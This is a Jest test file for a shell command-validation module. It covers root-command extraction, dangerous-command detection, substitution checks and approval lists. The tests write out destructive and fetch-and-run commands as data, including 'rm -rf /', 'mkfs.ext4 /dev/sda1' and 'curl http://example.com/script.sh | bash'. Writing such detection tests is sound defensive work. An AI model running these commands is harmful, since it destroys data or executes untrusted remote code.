import { describe, test, expect } from "@jest/globals";
import {
  extractRootCommands,
  isDangerousCommand,
  hasCommandSubstitution,
  validateCommand,
  isCommandApproved,
  getShellConfig,
} from "../utils/command-validation.js";

describe("Command Validation", () => {
  describe("extractRootCommands", () => {
    test("extracts single command", () => {
      expect(extractRootCommands("ls -la")).toEqual(["ls"]);
    });

    test("extracts chained commands with &&", () => {
      expect(extractRootCommands("npm install && npm start")).toEqual(["npm"]);
    });

    test("extracts piped commands", () => {
      expect(extractRootCommands("cat file.txt | grep test")).toEqual([
        "cat",
        "grep",
      ]);
    });

    test("extracts semicolon-separated commands", () => {
      expect(extractRootCommands("cd /tmp; ls -la; pwd")).toEqual([
        "cd",
        "ls",
        "pwd",
      ]);
    });

    test("handles commands with complex arguments", () => {
      expect(extractRootCommands('echo "hello world" && cat file.txt')).toEqual(
        ["echo", "cat"]
      );
    });

    test("deduplicates repeated commands", () => {
      expect(
        extractRootCommands("npm install && npm test && npm run build")
      ).toEqual(["npm"]);
    });

    test("handles empty strings", () => {
      expect(extractRootCommands("")).toEqual([]);
    });

    test("handles whitespace-only strings", () => {
      expect(extractRootCommands("   ")).toEqual([]);
    });
  });

  describe("isDangerousCommand", () => {
    test("detects rm -rf", () => {
      expect(isDangerousCommand("rm -rf /")).toBe(true);
    });

    test("detects rm -r", () => {
      expect(isDangerousCommand("rm -r /tmp/test")).toBe(true);
    });

    test("detects sudo", () => {
      expect(isDangerousCommand("sudo apt install package")).toBe(true);
    });

    test("detects su", () => {
      expect(isDangerousCommand("su - root")).toBe(true);
    });

    test("detects chmod 777", () => {
      expect(isDangerousCommand("chmod 777 file.txt")).toBe(true);
    });

    test("detects format command", () => {
      expect(isDangerousCommand("format C:")).toBe(true);
    });

    test("detects mkfs", () => {
      expect(isDangerousCommand("mkfs.ext4 /dev/sda1")).toBe(true);
    });

    test("detects apt install", () => {
      expect(isDangerousCommand("apt install nginx")).toBe(true);
    });

    test("detects yum install", () => {
      expect(isDangerousCommand("yum install httpd")).toBe(true);
    });

    test("detects npm global install", () => {
      expect(isDangerousCommand("npm install -g typescript")).toBe(true);
    });

    test("detects pip install", () => {
      expect(isDangerousCommand("pip install requests")).toBe(true);
    });

    test("detects curl pipe to bash", () => {
      expect(
        isDangerousCommand("curl http://example.com/script.sh | bash")
      ).toBe(true);
    });

    test("detects wget pipe to sh", () => {
      expect(
        isDangerousCommand("wget -O- http://example.com/script.sh | sh")
      ).toBe(true);
    });

    test("detects kill -9", () => {
      expect(isDangerousCommand("kill -9 1234")).toBe(true);
    });

    test("detects killall", () => {
      expect(isDangerousCommand("killall nginx")).toBe(true);
    });

    test("allows safe commands", () => {
      expect(isDangerousCommand("ls -la")).toBe(false);
      expect(isDangerousCommand("cat file.txt")).toBe(false);
      expect(isDangerousCommand("echo hello")).toBe(false);
      expect(isDangerousCommand("npm install")).toBe(false);
      expect(isDangerousCommand("git status")).toBe(false);
    });

    test("is case insensitive", () => {
      expect(isDangerousCommand("SUDO apt install")).toBe(true);
      expect(isDangerousCommand("Rm -rf /")).toBe(true);
    });
  });

  describe("hasCommandSubstitution", () => {
    test("detects $() substitution", () => {
      expect(hasCommandSubstitution("echo $(whoami)")).toBe(true);
    });

    test("detects backtick substitution", () => {
      expect(hasCommandSubstitution("echo `whoami`")).toBe(true);
    });

    test("detects <() substitution", () => {
      expect(hasCommandSubstitution("diff <(cat file1) <(cat file2)")).toBe(
        true
      );
    });

    test("detects >() substitution", () => {
      expect(hasCommandSubstitution("cat file > >(tee output.txt)")).toBe(true);
    });

    test("allows normal commands", () => {
      expect(hasCommandSubstitution("echo hello")).toBe(false);
      expect(hasCommandSubstitution("ls -la")).toBe(false);
      expect(hasCommandSubstitution("npm install")).toBe(false);
    });

    test("allows commands with $ in strings", () => {
      expect(hasCommandSubstitution('echo "Price: $100"')).toBe(false);
    });

    test("detects multiple substitutions", () => {
      expect(hasCommandSubstitution("echo $(date) and `whoami`")).toBe(true);
    });
  });

  describe("validateCommand", () => {
    test("allows valid simple command", () => {
      const result = validateCommand("ls -la", false);
      expect(result.allowed).toBe(true);
      expect(result.reason).toBeUndefined();
    });

    test("rejects empty command", () => {
      const result = validateCommand("", false);
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("Command cannot be empty");
    });

    test("rejects whitespace-only command", () => {
      const result = validateCommand("   ", false);
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("Command cannot be empty");
    });

    test("rejects command substitution when not allowed", () => {
      const result = validateCommand("echo $(whoami)", false);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Command substitution");
    });

    test("allows command substitution when explicitly allowed", () => {
      const result = validateCommand("echo $(whoami)", true);
      expect(result.allowed).toBe(true);
    });

    test("validates complex valid commands", () => {
      const result = validateCommand("npm install && npm test", false);
      expect(result.allowed).toBe(true);
    });
  });

  describe("isCommandApproved", () => {
    test("approves command when all roots are approved", () => {
      const approvedCommands = new Set(["npm", "git", "ls"]);
      expect(isCommandApproved("npm install", approvedCommands)).toBe(true);
    });

    test("rejects command when root is not approved", () => {
      const approvedCommands = new Set(["npm", "git"]);
      expect(isCommandApproved("sudo apt install", approvedCommands)).toBe(
        false
      );
    });

    test("approves chained commands when all roots approved", () => {
      const approvedCommands = new Set(["npm", "git"]);
      expect(
        isCommandApproved("npm install && npm test", approvedCommands)
      ).toBe(true);
    });

    test("rejects chained commands when any root not approved", () => {
      const approvedCommands = new Set(["npm"]);
      expect(
        isCommandApproved("npm install && git commit", approvedCommands)
      ).toBe(false);
    });

    test("approves piped commands when all roots approved", () => {
      const approvedCommands = new Set(["cat", "grep"]);
      expect(
        isCommandApproved("cat file.txt | grep test", approvedCommands)
      ).toBe(true);
    });
  });

  describe("getShellConfig", () => {
    test("returns shell configuration", () => {
      const config = getShellConfig();
      expect(config).toHaveProperty("shell");
      expect(config).toHaveProperty("args");
      expect(config).toHaveProperty("platform");
      expect(Array.isArray(config.args)).toBe(true);
    });

    test("platform-specific configuration is valid", () => {
      const config = getShellConfig();
      if (process.platform === "win32") {
        expect(config.shell).toBe("powershell.exe");
        expect(config.platform).toBe("Windows");
        expect(config.args).toContain("-NoProfile");
      } else {
        expect(config.shell).toBe("bash");
        expect(config.platform).toBe("Unix/Mac");
        expect(config.args).toContain("-c");
      }
    });
  });
});
